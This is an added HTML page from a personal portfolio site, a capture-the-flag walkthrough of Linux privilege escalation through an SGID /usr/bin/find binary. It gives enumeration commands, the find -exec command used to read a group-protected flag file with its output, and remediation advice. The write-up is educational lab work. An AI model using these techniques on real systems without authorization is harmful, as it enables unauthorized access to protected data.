@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SUID / SGID Privilege Escalation Walkthrough | Ahmed Vasil</title>
+  <meta name="description" content="SUID/SGID privilege escalation walkthrough — an SGID find binary runs with the ctf group's identity and the flag is group-readable.">
+  <link rel="canonical" href="https://vasilahmed744.github.io/Ahmed-Vasil-Portfolio/walkthrough-suid-sgid.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&amp;family=IBM+Plex+Serif:ital,wght@0,500;0,600;0,700;1,500&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="index.html"><span class="brand-mark">AV</span><span><span class="brand-name">Ahmed Vasil</span><br><span class="brand-role">Aspiring Penetration Tester</span></span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="projects.html">Projects</a>
+      <a href="skills.html">Skills</a>
+      <a href="journey.html">Journey</a>
+      <a href="walkthroughs.html" class="active">Walkthroughs</a>
+      <a href="contact.html" class="nav-cta">Contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="wrap">
+    <div class="page-head anim d1">
+      <span class="eyebrow"><span class="section-no">06</span>Walkthroughs · Privilege Escalation</span>
+      <div class="gold-rule"></div>
+      <h1>SUID / SGID Privilege Escalation Walkthrough</h1>
+      <p class="lede">Linux CTF — SGID /usr/bin/find. Full enumeration, analysis, exploitation and remediation.</p>
+    </div>
+    <section class="block wt-content">
+      <table class="info-table anim d2">
+        <tr><th>Target</th><td>172.31.1.172</td></tr>
+        <tr><th>Initial user</th><td>user (UID 1001, GID 1002)</td></tr>
+        <tr><th>Vulnerable binary</th><td>/usr/bin/find</td></tr>
+        <tr><th>Misconfiguration</th><td>SGID set; group owner = ctf</td></tr>
+        <tr><th>Privilege obtained</th><td>Effective GID ctf (1001)</td></tr>
+        <tr><th>Protected resource</th><td>/home/ctf/flag</td></tr>
+        <tr><th>Result</th><td>Flag successfully read through SGID execution context</td></tr>
+      </table>
+
+      <h2 class="anim d2">1. Objective and attack path</h2>
+      <p>The goal was not to guess an exploit immediately. The correct workflow was to enumerate privileged executables, identify an unusual permission assignment, prove the privilege transition, discover which resources that privilege could access, and only then use the privileged execution context.</p>
+      <pre class="code"><code>Low-privilege user
+        |
+        v
+Enumerate SUID / SGID files
+        |
+        v
+/usr/bin/find is SGID to group 'ctf'
+        |
+        v
+Verify: find -exec id -&gt; egid=ctf
+        |
+        v
+Locate files owned by group ctf
+        |
+        v
+/home/ctf/flag is group-readable
+        |
+        v
+Run cat through SGID find
+        |
+        v
+Flag read successfully</code></pre>
+
+      <h2>2. SUID and SGID — what the permission bits mean</h2>
+      <p>SUID (Set User ID) causes an executable to run with the effective user identity of the file owner. SGID (Set Group ID) on an executable causes it to run with the effective group identity of the file's group owner.</p>
+      <p>The vulnerable entry in this lab was:</p>
+      <pre class="code"><code>-rwxr-sr-x 1 root ctf 320160 Feb 18 2020 /usr/bin/find</code></pre>
+      <p>The important character is the <code class="inline">s</code> in the group execute position. The owner is root, the group is ctf, and the SGID bit means execution can obtain the effective group ID of ctf. This is different from a root-SUID binary: it does not automatically make the user root.</p>
+
+      <h2>3. Enumeration</h2>
+      <h3>3.1 Enumerate SUID files</h3>
+      <pre class="code"><code>find / -type f -perm -4000 -ls 2&gt;/dev/null</code></pre>
+      <p>This produced many normal system SUID binaries. Nothing should be exploited simply because it has SUID; standard entries must be distinguished from unusual or challenge-specific permissions.</p>
+      <h3>3.2 Enumerate both SUID and SGID</h3>
+      <pre class="code"><code>find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2&gt;/dev/null</code></pre>
+      <p>This wider search exposed the important entry:</p>
+      <pre class="code"><code>-rwxr-sr-x 1 root ctf 320160 Feb 18 2020 /usr/bin/find</code></pre>
+      <p>Why it stood out: find was assigned SGID to a challenge-specific group named ctf. Since find also supports -exec, commands launched through it became especially interesting to test.</p>
+
+      <h2>4. Proving the privilege transition</h2>
+      <h3>4.1 Check the normal identity</h3>
+      <pre class="code"><code>id
+uid=1001(user) gid=1002(user) groups=1002(user)</code></pre>
+      <p>The account was not a member of the ctf group under its normal identity.</p>
+      <h3>4.2 Execute id through the SGID binary</h3>
+      <pre class="code"><code>find / -maxdepth 0 -exec id \;
+uid=1001(user) gid=1002(user) egid=1001(ctf) groups=1001(ctf),1002(user)</code></pre>
+      <p>This was the decisive proof. The real UID remained user and the normal GID remained user, but the effective GID changed to ctf. Therefore, child commands executed by this SGID context could potentially use permissions granted to the ctf group.</p>
+      <p><strong>Key lesson:</strong> do not assume a permission misconfiguration is exploitable. First prove what effective identity the process actually receives.</p>
+
+      <h2>5. Finding what the new privilege can access</h2>
+      <p>Once egid=ctf was confirmed, the next question was: what files or directories are accessible to the ctf group that the normal user cannot access?</p>
+      <pre class="code"><code>find /home -group ctf -ls 2&gt;/dev/null</code></pre>
+      <p>Relevant output:</p>
+      <pre class="code"><code>drwxr-x--- 2 root ctf 4096 ... /home/ctf
+-r--r----- 1 root ctf   38 ... /home/ctf/flag</code></pre>
+      <p>The flag permissions were -r--r-----. Root had read permission, the ctf group also had read permission, and everyone else had no permission. The directory itself also permitted access to the ctf group.</p>
+
+      <h2>6. Validate the access control failure</h2>
+      <h3>6.1 Direct read as the normal user</h3>
+      <pre class="code"><code>cat /home/ctf/flag
+cat: /home/ctf/flag: Permission denied</code></pre>
+      <p>This failure was expected and useful. It proved that the normal account could not simply read the protected file.</p>
+      <h3>6.2 Read through the SGID find execution context</h3>
+      <pre class="code"><code>find /home/ctf/flag -exec cat {} \;
+ctf{ai3ooph4yaiYiquie7Ahr6chaequahru}</code></pre>
+      <p>The same cat operation succeeded when launched through SGID find, because the execution context had effective group ctf. The ctf group had read permission on the flag, so the kernel allowed the read.</p>
+      <div class="flag-callout"><span class="flag-label">Flag</span><code>ctf{ai3ooph4yaiYiquie7Ahr6chaequahru}</code></div>
+
+      <h2>7. Why the exploit works</h2>
+      <pre class="code"><code>Normal path:
+user -&gt; cat -&gt; /home/ctf/flag
+GID = user
+Result: Permission denied
+
+Privileged path:
+user -&gt; SGID /usr/bin/find -&gt; -exec cat -&gt; /home/ctf/flag
+                           |
+                           +-&gt; Effective GID = ctf
+Result: Read permitted by the file's group permission</code></pre>
+      <p>The vulnerability is therefore an SGID binary misconfiguration. The dangerous combination is not merely that SGID exists; it is that a powerful utility capable of executing arbitrary commands was assigned a privileged group identity whose resources should not be available to the unprivileged user.</p>
+
+      <h2>8. How to discover this without a walkthrough</h2>
+      <p>A reusable Linux privilege-escalation methodology is:</p>
+      <ol class="step-list">
+        <li><strong>Establish identity</strong> — <code class="inline">id</code>, <code class="inline">whoami</code>, groups and current access.</li>
+        <li><strong>Enumerate privileged execution</strong> — <code class="inline">sudo -l</code>, SUID/SGID binaries, file capabilities, cron/timers and privileged services.</li>
+        <li><strong>Identify anomalies</strong> — look for custom paths, unusual group owners, unexpected SUID/SGID on powerful utilities, writable inputs and executables.</li>
+        <li><strong>Understand behavior</strong> — check help, permissions, file type and what commands/files the program can invoke or access.</li>
+        <li><strong>Prove the transition</strong> — run a harmless identity check such as <code class="inline">id</code> through the suspected mechanism.</li>
+        <li><strong>Map privilege to resources</strong> — search for files/directories owned by or accessible to the newly obtained user/group.</li>
+        <li><strong>Validate normal denial</strong> — confirm the resource is not already accessible with the original identity.</li>
+        <li><strong>Use the minimum needed</strong> — exercise the privileged context only enough to access the intended protected resource.</li>
+      </ol>
+
+      <h2>9. Useful enumeration commands</h2>
+      <pre class="code"><code># Identity / sudo
+id
+whoami
+sudo -l
+
+# SUID only
+find / -type f -perm -4000 -ls 2&gt;/dev/null
+
+# SUID + SGID
+find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2&gt;/dev/null
+
+# File capabilities
+getcap -r / 2&gt;/dev/null
+
+# Group-owned resources after discovering an interesting group
+find /home -group ctf -ls 2&gt;/dev/null
+find / -group ctf -ls 2&gt;/dev/null
+
+# Prove SGID behavior in this lab
+find / -maxdepth 0 -exec id \;</code></pre>
+
+      <h2>10. Remediation</h2>
+      <p>The unnecessary SGID permission should be removed from /usr/bin/find. A standard system utility capable of executing other commands should not carry an unrelated privileged group identity.</p>
+      <pre class="code"><code>chmod g-s /usr/bin/find
+ls -l /usr/bin/find</code></pre>
+      <p>Administrators should also audit SUID/SGID assignments regularly, restrict sensitive group membership and group-readable resources, and investigate why a general-purpose command-execution utility received the ctf group's privilege in the first place.</p>
+
+      <h2>11. Final findings</h2>
+      <table class="wt-table">
+        <tr><th>Finding</th><td>SGID misconfiguration on /usr/bin/find</td></tr>
+        <tr><th>Original identity</th><td>uid=1001(user), gid=1002(user)</td></tr>
+        <tr><th>Effective privilege</th><td>egid=1001(ctf) when executing through find</td></tr>
+        <tr><th>Impact</th><td>Unauthorized access to data restricted to the ctf group</td></tr>
+        <tr><th>Protected file</th><td>/home/ctf/flag</td></tr>
+        <tr><th>Proof</th><td>Direct cat denied; cat via find -exec succeeded</td></tr>
+        <tr><th>Classification</th><td>Local privilege escalation / improper privileged executable configuration</td></tr>
+      </table>
+      <p>Prepared from the commands and outputs observed during the authorized CTF/lab session.</p>
+      <div class="wt-nav">
+        <a href="walkthrough-sudoers-less.html">← Sudoers / less CTF</a>
+        <a href="walkthrough-privilege-escalation.html">Next: CTF Privilege Escalation →</a>
+      </div>
+    </section>
+  </div>
+</main>
+<footer>
+  <div class="wrap footer-cta"><a href="contact.html">Work with me →</a></div>
+  <div class="wrap footer-inner">
+    <span class="f-name">Ahmed Vasil</span>
+    <span class="f-role">Aspiring Penetration Tester</span>
+    <span class="footer-links"><a href="https://github.com/vasilahmed744">GitHub</a><a href="https://www.linkedin.com/in/ahamad-vasil-205590386">LinkedIn</a></span>
+  </div>
+  <div class="wrap footer-base"><span>© Ahmed Vasil</span><span>Narasimharajapura, Karnataka, India</span></div>
+</footer>
+</body>
+</html>
